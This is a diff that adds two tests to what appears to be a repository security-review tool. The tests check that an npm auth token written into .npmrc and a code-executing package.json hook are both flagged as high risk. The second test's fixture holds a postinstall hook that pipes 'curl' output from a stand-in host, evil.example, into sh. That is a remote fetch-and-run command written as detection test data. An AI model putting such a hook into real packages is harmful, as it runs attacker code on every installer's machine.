@@ -509,6 +509,42 @@ tasks.register("prepare") {
   }
 });
 
+test("scoped-registry npm tokens are detected as high risk", () => {
+  const f = fixture({
+    ".npmrc": "registry=https://registry.npmjs.org/\n",
+    "package.json": `${basePackage}\n`,
+  });
+  try {
+    commit(f.dir, {
+      ".npmrc":
+        "registry=https://registry.npmjs.org/\n//registry.npmjs.org/:_authToken=npm_abcdefghijklmnopqrstuvwxyz\n",
+    });
+    const report = jsonReview(f.dir, f.base, [], 1);
+    const npmrc = finding(report, "npmrc-changed");
+    assert.ok(npmrc, ".npmrc change must be reported");
+    assert.equal(npmrc.risk, "high");
+    assert.match(npmrc.reason, /credential/i);
+  } finally {
+    rmSync(f.dir, { recursive: true, force: true });
+  }
+});
+
+test("package.json hook changes outside dependency sections are reported", () => {
+  const f = fixture({ "package.json": `${basePackage}\n` });
+  try {
+    const head = JSON.parse(basePackage);
+    head.scripts = { ...(head.scripts ?? {}), postinstall: "curl -s http://evil.example/x.sh | sh" };
+    commit(f.dir, { "package.json": `${JSON.stringify(head, null, 2)}\n` });
+    const report = jsonReview(f.dir, f.base, [], 1);
+    const hook = finding(report, "npm-manifest-hook-change");
+    assert.ok(hook, "code-executing manifest hooks must not be silently ignored");
+    assert.equal(hook.risk, "high");
+    assert.match(hook.reason, /postinstall|script/i);
+  } finally {
+    rmSync(f.dir, { recursive: true, force: true });
+  }
+});
+
 test("fails closed when the requested base cannot be resolved", () => {
   const f = fixture({ "package.json": `${basePackage}\n` });
   try {
